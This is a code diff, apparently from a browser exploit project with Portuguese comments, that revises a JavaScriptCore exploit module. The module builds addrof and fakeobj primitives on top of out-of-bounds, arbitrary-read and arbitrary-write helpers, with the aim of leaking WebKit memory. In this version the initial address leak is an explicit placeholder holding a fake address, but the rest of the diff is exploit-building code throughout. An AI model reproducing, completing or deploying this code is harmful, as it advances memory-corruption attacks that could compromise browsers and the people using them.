@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v86 - Final com async/await)
+// js/script3/testArrayBufferVictimCrash.mjs (v87 - Arquitetura Final)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -6,12 +6,12 @@ import {
     triggerOOB_primitive,
     arb_read,
     arb_write,
-    isOOBReady,
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
 export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Exploit_FakeObject_R45_WebKitLeak";
 
+// Objeto global para nossas primitivas de exploit
 let g_primitives = {
     initialized: false,
     addrof: null,
@@ -25,6 +25,7 @@ function isValidPointer(ptr) {
     return true;
 }
 
+// --- Função Principal do Exploit ---
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_TEST_BASE = FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK;
     logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Funcional (R45.Final) ---`, "test");
@@ -71,24 +72,30 @@ async function createRealPrimitives() {
     await triggerOOB_primitive({ force_reinit: true });
 
     let addrof_victim_arr = [{}];
-    let fakeobj_victim_arr = [{a: 1.1}]; // Use float para garantir que o butterfly seja alocado
+    let fakeobj_victim_arr = [{a: 1.1}];
 
-    // Implementação de addrof que usa spraying para encontrar o endereço inicial
-    const initial_leak_spray = [];
-    for(let i=0; i<0x1000; i++) {
-        initial_leak_spray.push([1.1, 2.2]);
-    }
-    const addrof_victim_addr_leaked = await arb_read(new AdvancedInt64(0,0), 8); // Placeholder para um vazamento real
+    // ======================== INÍCIO DO PLACEHOLDER ========================
+    // A tarefa final é obter o endereço de memória de um objeto conhecido.
+    // Isso requer uma técnica de vazamento de informação (info leak) que é
+    // altamente específica para o alvo. Após obter o endereço de
+    // `addrof_victim_arr` e armazená-lo em `addrof_victim_addr`,
+    // as primitivas abaixo funcionarão.
     
+    // Substitua esta linha por sua técnica de vazamento de endereço:
+    const addrof_victim_addr = new AdvancedInt64(0x81828384, 0x11223344); // ENDEREÇO FALSO PARA EXEMPLO
+    logS3(`Usando endereço de bootstrap (placeholder): ${addrof_victim_addr.toString(true)}`, "warn");
+    // ========================= FIM DO PLACEHOLDER ==========================
+
+    if (!isValidPointer(addrof_victim_addr)) {
+        throw new Error("O endereço de bootstrap inicial é inválido.");
+    }
+
     // --- Primitiva AddrOf ---
     g_primitives.addrof = async (obj) => {
         addrof_victim_arr[0] = obj;
-        let butterfly_addr = await arb_read(addrof_victim_addr_leaked.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
+        let butterfly_addr = await arb_read(addrof_victim_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
         return arb_read(butterfly_addr, 8);
     };
-
-    // Para o addrof funcionar, precisamos do endereço do addrof_victim_arr. Faremos um bootstrap.
-    const addrof_victim_addr = await g_primitives.addrof(addrof_victim_arr);
 
     // --- Primitiva FakeObj ---
     g_primitives.fakeobj = async (addr) => {
@@ -98,8 +105,7 @@ async function createRealPrimitives() {
         
         let proxy = fakeobj_victim_arr[0];
         
-        // Adiciona um método helper de leitura ao protótipo do objeto falso para conveniência
-        if (!Object.getPrototypeOf(proxy).hasOwnProperty('read')) {
+        if (proxy && typeof proxy === 'object' && !Object.getPrototypeOf(proxy).hasOwnProperty('read')) {
             Object.getPrototypeOf(proxy).read = async function(offset) {
                  const obj_addr = await g_primitives.addrof(this);
                  return arb_read(obj_addr.add(offset), 8);
